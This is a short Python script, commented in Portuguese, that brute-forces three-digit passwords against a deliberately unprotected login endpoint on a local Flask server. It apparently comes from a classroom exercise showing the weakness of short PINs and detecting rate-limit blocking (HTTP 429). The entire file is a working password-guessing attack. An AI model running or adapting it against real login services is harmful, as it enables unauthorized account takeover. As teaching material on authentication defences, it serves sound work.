import requests

def ataque_brute_force():
    # Aponta para o endpoint vulnerável do seu servidor Flask local
    url = "http://127.0.0.1:5000/api/login-sem-protecao"
    usuario = "admin_fraco"
    senha_correta = False
    tentativa = 0

    print(f"Iniciando ataque de Força Bruta contra o utilizador: {usuario}")

    # Laço do pseudocódigo: de 000 a 999
    while tentativa <= 999 and not senha_correta:
        # Formata o número para ter sempre 3 dígitos (ex: "000", "001")
        senha_teste = f"{tentativa:03d}"
        print(f"Testando senha: {senha_teste}")

        payload = {"usuario": usuario, "senha": senha_teste}
        
        try:
            # Envia a palavra-passe para o login via POST
            resposta = requests.post(url, json=payload)
            
            # Se o servidor devolver 200 OK, a palavra-passe está correta
            if resposta.status_code == 200:
                senha_correta = True
                print(f"\n[+] SUCESSO! Senha encontrada: {senha_teste}")
            # Se devolver 429, significa que a defesa (Rate Limit/Lockout) entrou em ação
            elif resposta.status_code == 429:
                print(f"\n[-] Bloqueio do servidor (Rate Limit) detetado na tentativa {senha_teste}.")
                break
            else:
                tentativa += 1
                
        except requests.exceptions.RequestException as erro:
            print(f"Erro de conexão: {erro}")
            break

    if not senha_correta:
        print("\nSenha não encontrada.")

if __name__ == "__main__":
    ataque_brute_force()